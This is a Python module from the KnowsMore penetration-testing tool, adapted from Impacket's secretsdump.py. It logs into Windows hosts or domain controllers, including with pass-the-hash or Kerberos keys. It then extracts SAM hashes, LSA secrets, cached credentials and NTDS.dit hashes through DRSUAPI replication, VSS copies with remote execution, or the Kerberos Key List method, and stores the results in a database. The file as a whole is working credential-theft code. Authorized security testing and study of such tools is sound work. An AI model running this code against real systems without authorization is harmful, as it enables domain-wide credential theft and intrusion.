# KnowsMore secretsdump.py module
#
# This module was adapted from secretsdump.py developed by Fortra
# https://github.com/fortra/impacket/blob/master/examples/secretsdump.py
#
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright (C) 2022 Fortra. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Performs various techniques to dump hashes from the
#   remote machine without executing any agent there.
#   For SAM and LSA Secrets (including cached creds)
#   we try to read as much as we can from the registry
#   and then we save the hives in the target system
#   (%SYSTEMROOT%\\Temp dir) and read the rest of the
#   data from there.
#   For NTDS.dit we either:
#       a. Get the domain users list and get its hashes
#          and Kerberos keys using [MS-DRDS] DRSGetNCChanges()
#          call, replicating just the attributes we need.
#       b. Extract NTDS.dit via vssadmin executed  with the
#          smbexec approach.
#          It's copied on the temp dir and parsed remotely.
#
#   The script initiates the services required for its working
#   if they are not available (e.g. Remote Registry, even if it is
#   disabled). After the work is done, things are restored to the
#   original state.
#
# Author from original secretsdump.py:
#   Alberto Solino (@agsolino)
#
# References from original secretsdump.py:
#   Most of the work done by these guys. I just put all
#   the pieces together, plus some extra magic.
#
#   - https://github.com/gentilkiwi/kekeo/tree/master/dcsync
#   - https://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html
#   - https://moyix.blogspot.com.ar/2008/02/decrypting-lsa-secrets.html
#   - https://moyix.blogspot.com.ar/2008/02/cached-domain-credentials.html
#   - https://web.archive.org/web/20130901115208/www.quarkslab.com/en-blog+read+13
#   - https://code.google.com/p/creddump/
#   - https://lab.mediaservice.net/code/cachedump.rb
#   - https://insecurety.net/?p=768
#   - https://web.archive.org/web/20190717124313/http://www.beginningtoseethelight.org/ntsecurity/index.htm
#   - https://www.exploit-db.com/docs/english/18244-active-domain-offline-hash-dump-&-forensic-analysis.pdf
#   - https://www.passcape.com/index.php?section=blog&cmd=details&id=15
#


# Impacket
from __future__ import division
from __future__ import print_function
import argparse
import codecs
import datetime
import json
import logging
import os
import sys

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.smbconnection import SMBConnection

from ..libs.ntdsuseraccount import NTDSUserAccount
from ..libs.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes, \
    KeyListSecrets
from impacket.krb5.keytab import Keytab

from knowsmore.util.knowsmoredb import KnowsMoreDB

try:
    input = raw_input
except NameError:
    pass


import errno
import os
import re
from argparse import _ArgumentGroup, Namespace
from enum import Enum
from clint.textui import progress

from knowsmore.cmdbase import CmdBase
from knowsmore.config import Configuration
from knowsmore.password import Password
from knowsmore.util.color import Color
from knowsmore.util.logger import Logger
from knowsmore.util.tools import Tools


class DumpSecrets:
    __db = None
    __secret_callback = None

    def __init__(self, remoteName, username='', password='', domain='', options=None, secret_callback=None):
        self.__secret_callback = secret_callback
        self.__useVSSMethod = options.use_vss
        self.__useKeyListMethod = options.use_keylist
        self.__remoteName = remoteName
        self.__remoteHost = options.target_ip
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = options.aesKey
        self.__aesKeyRodc = options.rodcKey
        self.__smbConnection = None
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__NTDSHashes = None
        self.__LSASecrets = None
        self.__KeyListSecrets = None
        self.__rodc = options.rodcNo
        self.__systemHive = options.system
        self.__bootkey = options.bootkey
        self.__securityHive = options.security
        self.__samHive = options.sam
        self.__ntdsFile = options.ntds
        self.__history = False
        self.__noLMHash = True
        self.__isRemote = True
        self.__outputFileName = None
        self.__doKerberos = options.k
        self.__justDC = options.just_dc
        self.__justDCNTLM = options.just_dc_ntlm
        self.__justUser = options.just_dc_user
        self.__pwdLastSet = True
        self.__printUserStatus = True
        self.__resumeFileName = options.resumefile
        self.__canProcessSAMLSA = True
        self.__kdcHost = options.dc_ip
        self.__options = options

        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    def connect(self):
        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                               self.__nthash, self.__aesKey, self.__kdcHost)
        else:
            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def dump(self):
        try:
            if self.__remoteName.upper() == 'LOCAL' and self.__username == '':
                self.__isRemote = False
                self.__useVSSMethod = True
                if self.__systemHive:
                    localOperations = LocalOperations(self.__systemHive)
                    bootKey = localOperations.getBootKey()
                    if self.__ntdsFile is not None:
                    # Let's grab target's configuration about LM Hashes storage
                        self.__noLMHash = localOperations.checkNoLMHashPolicy()
                else:
                    import binascii
                    bootKey = binascii.unhexlify(self.__bootkey)

            else:
                self.__isRemote = True
                bootKey = None
                try:
                    try:
                        self.connect()
                    except Exception as e:
                        if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                            # SMBConnection failed. That might be because there was no way to log into the
                            # target system. We just have a last resort. Hope we have tickets cached and that they
                            # will work
                            logging.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
                            pass
                        else:
                            raise

                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
                    self.__remoteOps.setExecMethod(self.__options.exec_method)
                    if self.__justDC is False and self.__justDCNTLM is False and self.__useKeyListMethod is False or self.__useVSSMethod is True:
                        self.__remoteOps.enableRegistry()
                        bootKey = self.__remoteOps.getBootKey()
                        # Let's check whether target system stores LM Hashes
                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
                except Exception as e:
                    self.__canProcessSAMLSA = False
                    if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
                        and self.__doKerberos is True:
                        # Giving some hints here when SPN target name validation is set to something different to Off
                        # This will prevent establishing SMB connections using TGS for SPNs different to cifs/
                        logging.error('Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user')
                    else:
                        logging.error('RemoteOperations failed: %s' % str(e))

            # If the KerberosKeyList method is enable we dump the secrets only via TGS-REQ
            if self.__useKeyListMethod is True:
                try:
                    self.__KeyListSecrets = KeyListSecrets(self.__domain, self.__remoteName, self.__rodc, self.__aesKeyRodc, self.__remoteOps)
                    self.__KeyListSecrets.dump()
                except Exception as e:
                    logging.error('Something went wrong with the Kerberos Key List approach.: %s' % str(e))
            else:
                # If RemoteOperations succeeded, then we can extract SAM and LSA
                if self.__justDC is False and self.__justDCNTLM is False and self.__canProcessSAMLSA:
                    try:
                        if self.__isRemote is True:
                            SAMFileName = self.__remoteOps.saveSAM()
                        else:
                            SAMFileName = self.__samHive

                        self.__SAMHashes = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
                        self.__SAMHashes.dump()
                        if self.__outputFileName is not None:
                            self.__SAMHashes.export(self.__outputFileName)
                    except Exception as e:
                        logging.error('SAM hashes extraction failed: %s' % str(e))

                    try:
                        if self.__isRemote is True:
                            SECURITYFileName = self.__remoteOps.saveSECURITY()
                        else:
                            SECURITYFileName = self.__securityHive

                        self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
                                                       isRemote=self.__isRemote, history=self.__history)
                        self.__LSASecrets.dumpCachedHashes()
                        if self.__outputFileName is not None:
                            self.__LSASecrets.exportCached(self.__outputFileName)
                        self.__LSASecrets.dumpSecrets()
                        if self.__outputFileName is not None:
                            self.__LSASecrets.exportSecrets(self.__outputFileName)
                    except Exception as e:
                        if logging.getLogger().level == logging.DEBUG:
                            import traceback
                            traceback.print_exc()
                        logging.error('LSA hashes extraction failed: %s' % str(e))

                # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
                if self.__isRemote is True:
                    if self.__useVSSMethod and self.__remoteOps is not None and self.__remoteOps.getRRP() is not None:
                        NTDSFileName = self.__remoteOps.saveNTDS()
                    else:
                        NTDSFileName = None
                else:
                    NTDSFileName = self.__ntdsFile

                self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,
                                               noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
                                               useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
                                               pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
                                               outputFileName=self.__outputFileName, justUser=self.__justUser,
                                               printUserStatus= self.__printUserStatus,
                                               perSecretCallback=self.__secret_callback)
                try:
                    self.__NTDSHashes.dump()
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                        # We don't store the resume file if this error happened, since this error is related to lack
                        # of enough privileges to access DRSUAPI.
                        resumeFile = self.__NTDSHashes.getResumeSessionFile()
                        if resumeFile is not None:
                            os.unlink(resumeFile)
                    logging.error(e)
                    if self.__justUser and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >=0:
                        logging.info("You just got that error because there might be some duplicates of the same name. "
                                     "Try specifying the domain name for the user as well. It is important to specify it "
                                     "in the form of NetBIOS domain name/user (e.g. contoso/Administratror).")
                    elif self.__useVSSMethod is False:
                        logging.info('Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter')
                self.cleanup()
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)
            if self.__NTDSHashes is not None:
                if isinstance(e, KeyboardInterrupt):
                    resumeFile = self.__NTDSHashes.getResumeSessionFile()
                    if resumeFile is not None:
                        while True:
                            answer = input("Delete resume session file? [y/N] ")
                            if answer.upper() == '':
                                answer = 'N'
                                break
                            elif answer.upper() == 'Y':
                                answer = 'Y'
                                break
                            elif answer.upper() == 'N':
                                answer = 'N'
                                break
                        if answer == 'Y':
                            os.unlink(resumeFile)
            try:
                self.cleanup()
            except:
                pass

    def cleanup(self):
        logging.info('Cleaning up... ')
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__SAMHashes:
            self.__SAMHashes.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()
        if self.__NTDSHashes:
            self.__NTDSHashes.finish()
        if self.__KeyListSecrets:
            self.__KeyListSecrets.finish()


class SecretsDump(CmdBase):
    db = None
    remoteName = username = password = domain = ''
    options = None
    ct_count = nt_count = 0
    domain_cache = {}

    def __init__(self):
        super().__init__('secrets-dump', 'Import NTLM hashes and users/machines using impacket lib')

    def add_flags(self, flags: _ArgumentGroup):
        pass

    def add_commands(self, cmds: _ArgumentGroup):

        cmds.add_argument('-target', action='store',
                          help='[[domain/]username[:password]@]<targetName or address> or LOCAL'
                               ' (if you want to parse local files)')
        #cmds.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
        #cmds.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
        cmds.add_argument('-system', action='store', help='SYSTEM hive to parse')
        cmds.add_argument('-bootkey', action='store', help='bootkey for SYSTEM hive')
        cmds.add_argument('-security', action='store', help='SECURITY hive to parse')
        cmds.add_argument('-sam', action='store', help='SAM hive to parse')
        cmds.add_argument('-ntds', action='store', help='NTDS.DIT file to parse')
        cmds.add_argument('-resumefile', action='store', help='resume file name to resume NTDS.DIT session dump (only '
                                                              'available to DRSUAPI approach). This file will also be used to keep updating the session\'s '
                                                              'state')
        #cmds.add_argument('-outputfile', action='store',
        #                  help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
        cmds.add_argument('-use-vss', action='store_true', default=False,
                          help='Use the VSS method instead of default DRSUAPI')
        cmds.add_argument('-rodcNo', action='store', type=int,
                          help='Number of the RODC krbtgt account (only avaiable for Kerb-Key-List approach)')
        cmds.add_argument('-rodcKey', action='store',
                          help='AES key of the Read Only Domain Controller (only avaiable for Kerb-Key-List approach)')
        cmds.add_argument('-use-keylist', action='store_true', default=False,
                          help='Use the Kerb-Key-List method instead of default DRSUAPI')
        cmds.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec',
                          help='Remote exec '
                               'method to use at target (only when using -use-vss). Default: smbexec')

    def add_groups(self, parser: argparse.ArgumentParser):
        group = parser.add_argument_group('display options')
        group.add_argument('-just-dc-user', action='store', metavar='USERNAME',
                           help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. '
                                'Implies also -just-dc switch')
        group.add_argument('-just-dc', action='store_true', default=False,
                           help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
        group.add_argument('-just-dc-ntlm', action='store_true', default=False,
                           help='Extract only NTDS.DIT data (NTLM hashes only)')
        #group.add_argument('-pwd-last-set', action='store_true', default=False,
        #                   help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
        #group.add_argument('-user-status', action='store_true', default=False,
        #                   help='Display whether or not the user is disabled')
        #group.add_argument('-history', action='store_true', help='Dump password history, and LSA secrets OldVal')

        group = parser.add_argument_group('authentication')
        group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH",
                           help='NTLM hashes, format is LMHASH:NTHASH')
        group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
        group.add_argument('-k', action="store_true",
                           help='Use Kerberos authentication. Grabs credentials from ccache file '
                                '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
                                ' the ones specified in the command line')
        group.add_argument('-aesKey', action="store", metavar="hex key",
                           help='AES key to use for Kerberos Authentication'
                                ' (128 or 256 bits)')
        group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

        group = parser.add_argument_group('connection')
        group.add_argument('-dc-ip', action='store', metavar="ip address",
                           help='IP Address of the domain controller. If '
                                'ommited it use the domain part (FQDN) specified in the target parameter')
        group.add_argument('-target-ip', action='store', metavar="ip address",
                           help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                                'This is useful when target is the NetBIOS name and you cannot resolve it')

    def load_from_arguments(self, args: Namespace) -> bool:

        if args.target is None or args.target == '':
            Tools.mandatory()

        domain, username, password, remoteName = parse_target(args.target)

        if args.just_dc_user is not None:
            if args.use_vss is True:
                Logger.pl('{!} {R}error: -just-dc-user switch is not supported in VSS mode{W}\r\n')
                Tools.exit_gracefully(1)
            elif args.resumefile is not None:
                Logger.pl('{!} {R}error: resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch{W}\r\n')
                Tools.exit_gracefully(1)
            elif remoteName.upper() == 'LOCAL' and username == '':
                Logger.pl(
                    '{!} {R}error: -just-dc-user not compatible in LOCAL mode{W}\r\n')
                Tools.exit_gracefully(1)
            else:
                # Having this switch on implies not asking for anything else.
                args.just_dc = True

        if args.use_vss is True and args.resumefile is not None:
            Logger.pl(
                '{!} {R}error: resuming a previous NTDS.DIT dump session is not supported in VSS mode{W}\r\n')
            Tools.exit_gracefully(1)

        if args.use_keylist is True and (args.rodcNo is None or args.rodcKey is None):
            Logger.pl(
                '{!} {R}error: Both the RODC ID number and the RODC key are required for the Kerb-Key-List approach{W}\r\n')
            Tools.exit_gracefully(1)

        if remoteName.upper() == 'LOCAL' and username == '' and args.resumefile is not None:
            Logger.pl(
                '{!} {R}error: resuming a previous NTDS.DIT dump session is not supported in LOCAL mode{W}\r\n')
            Tools.exit_gracefully(1)

        if remoteName.upper() == 'LOCAL' and username == '':
            if args.system is None and args.bootkey is None:
                Logger.pl(
                    '{!} {R}error: Either the SYSTEM hive or bootkey is required for local parsing, check help{W}\r\n')
                Tools.exit_gracefully(1)

        else:

            if args.target_ip is None:
                args.target_ip = remoteName

            if domain is None:
                domain = ''

            if args.keytab is not None:
                Keytab.loadKeysFromKeytab(args.keytab, username, domain, args)
                args.k = True

            if password == '' and username != '' and args.hashes is None and args.no_pass is False and args.aesKey is None:
                from getpass import getpass

                password = getpass("Password:")

            if args.aesKey is not None:
                args.k = True

        if remoteName is None or remoteName == '':
            Tools.mandatory()

        self.remoteName = remoteName
        self.username = username
        self.password = password
        self.domain = domain
        self.options = args

        self.db = self.open_db(args)

        return True

    def run(self):
        self.ct_count = self.nt_count = 0
        try:
            #logging.getLogger().setLevel(logging.DEBUG)
            # Print the Library's installation path
            #logging.debug(version.getInstallationPath())

            Color.pl('{?} {W}{D}Starting, wait...{W}')
            dumper = DumpSecrets(self.remoteName,
                                 self.username,
                                 self.password,
                                 self.domain,
                                 self.options,
                                 self.__secret_callback)
            dumper.dump()
        except KeyboardInterrupt as e:
            raise e
        except Exception as e:
            Tools.clear_line()
            raise e
        finally:
            Tools.clear_line()

    def __secret_callback(self, secret_type, secret):

        if self.nt_count < 0xf or self.nt_count & 0xf == 0:
            sys.stderr.write("\033[K")
            print((" Importing: NTDS => %d, Clear text => %d" % (self.nt_count, self.ct_count)), end='\r', flush=True, file=sys.stderr)

        if secret_type == NTDSHashes.SECRET_TYPE.NTDS:
            if not isinstance(secret, NTDSUserAccount):
                Logger.pl('{!} {R}error: NTDS hash format is invalid: {O}%s{R}\r\n' % secret)
                Tools.exit_gracefully(1)

            # Ignore history
            if secret.history == -1:
                self.nt_count += 1
                self.add_credential(secret.domain, secret.user_name, secret.nt_hash)

        elif secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
            Color.pl('{?} {W}{D}Kerberos: {G}%s{W}' % secret)

        elif secret_type == NTDSHashes.SECRET_TYPE.NTDS_CLEARTEXT:
            if not isinstance(secret, NTDSUserAccount):
                Logger.pl('{!} {R}error: NTDS_CLEARTEXT hash format is invalid: {O}%s{R}\r\n' % secret)
                Tools.exit_gracefully(1)

            self.ct_count += 1

            pwd = Password(
                ntlm_hash='',
                clear_text=secret.clear_text
            )

            self.add_credential(secret.domain, secret.user_name, pwd.ntlm_hash)

            pdata = {}
            if len(Configuration.company) > 0:
                pdata['company_similarity'] = sorted(
                    [pwd.calc_ratio(n1) for n1 in Configuration.company]
                )[-1]

            self.db.insert_password_manually(pwd, **pdata)

        else:
            print(secret_type)
            print(secret)
            raise Exception('Implement!')

    def add_credential(self, domain, name, hash, rid: str = '', sid: str = ''):

        domain_id = -1
        name = name.lower()
        bloodhound_object = None
        label = ''

        # find by object id
        if sid is not None and sid.strip() != '' and len(sid) > 30 and sid[0:2].upper() == "S-":
            tmp = sid.split("-")
            if len(tmp) >= 5:
                # Temos um possível SID válido
                if tmp[-1].upper() == rid.upper():
                    domainsid = sid[:-1]
                    d = self.db.select_raw(
                        sql="select domain_id from domains as d "
                            "where object_identifier = ?",
                        args=[domainsid.upper()]
                    )
                    if len(d) == 1:  # Not permit duplicity
                        domain_id = d[0]['domain_id']

                    obj = self.db.select_raw(
                        sql="select props, name, object_label from bloodhound_objects as o "
                            "where object_id = ? "
                            "and object_label in ('User', 'Computer')",
                        args=[sid]
                    )
                    if len(obj) == 1:  # Not permit duplicity
                        try:
                            bloodhound_object = json.loads(obj[0]['props'])
                            label = obj[0]['object_label']
                        except:
                            pass

        # find by r_id and name
        if bloodhound_object is None and rid is not None and rid.strip() != '':
            s_name = name
            if s_name.endswith('$'):
                s_name = s_name[:-1]
            obj = self.db.select_raw(
                sql="select props, name, object_label from bloodhound_objects as o "
                    "where r_id = ? and name = ? "
                    "and object_label in ('User', 'Computer')",
                args=[rid, s_name.upper()]
            )
            if len(obj) == 1:  # Not permit duplicity
                try:
                    bloodhound_object = json.loads(obj[0]['props'])
                    label = obj[0]['object_label']
                except:
                    pass

        type = 'U'
        if bloodhound_object is not None:
            p_name = bloodhound_object.get('name', '').lower()
            p_domain = bloodhound_object.get('domain', '').lower()
            p_domainsid = bloodhound_object.get('domainsid', '').upper()
            p_name = p_name.replace(f'@{p_domain}', '').replace(f'.{p_domain}', '')
            p_dn = bloodhound_object.get('distinguishedname', '')
            p_sid = bloodhound_object.get('source', '')
            p_full_name = bloodhound_object.get('displayname', '')
            p_pwd_last_set = datetime.datetime.fromtimestamp(bloodhound_object.get('pwdlastset', 0))
            p_enabled = bool(bloodhound_object.get('enabled', True))
            type = 'M' if label.lower() == 'machine' else 'U'
            if p_name == name:
                if domain_id == -1:
                    domain_id = self.get_domain(
                        name=domain,
                        object_identifier=p_domainsid
                    )
                if domain_id != -1:
                    self.db.insert_or_update_credential(
                        domain=domain_id,
                        username=name,
                        ntlm_hash=hash,
                        type=type,
                        dn=p_dn,
                        full_name=p_full_name,
                        object_identifier=p_sid,
                        pwd_last_set=p_pwd_last_set,
                        enabled=p_enabled
                    )
                    return

        # o processo via bloodhound, não deu certo, vamos para o fallback então
        #print(name, rid, sid)
        if name.endswith('$'):
            name = name[:-1]
            type = 'M'

        if name == '' or hash == '':
            return

        if domain == '':
            domain = 'default'

        # try to locate this host previously imported by BloodHound
        domain_id = -1
        if domain == 'default':
            d = self.db.select_raw(
                sql="select c.domain_id from credentials as c "
                    "where name = ? and domain_id <> 1 and type = ?",
                args=[name, type]
            )
            if len(d) == 1:  # Not permit duplicity
                domain_id = d[0]['domain_id']

        if domain_id == -1:
            domain_id = self.get_domain(domain)

        if domain_id == -1:
            Tools.clear_line()
            Logger.pl('{!} {R}error: Was not possible to import the domain {O}%s{R}\r\n' % domain)
            Tools.exit_gracefully(1)

        self.db.insert_or_update_credential(
            domain=domain_id,
            username=name,
            ntlm_hash=hash,
            type=type,
        )

    def get_domain(self, name: str, object_identifier: str = '') -> int:

        name = name.lower()

        if name in self.domain_cache:
            return self.domain_cache[name]

        domain_id = self.db.insert_or_get_domain(
            domain=name,
            object_identifier=object_identifier
        )

        if domain_id == -1:
            raise Exception('Unable to get/create domain from Name: %s' % name)

        self.domain_cache[name] = domain_id

        return domain_id
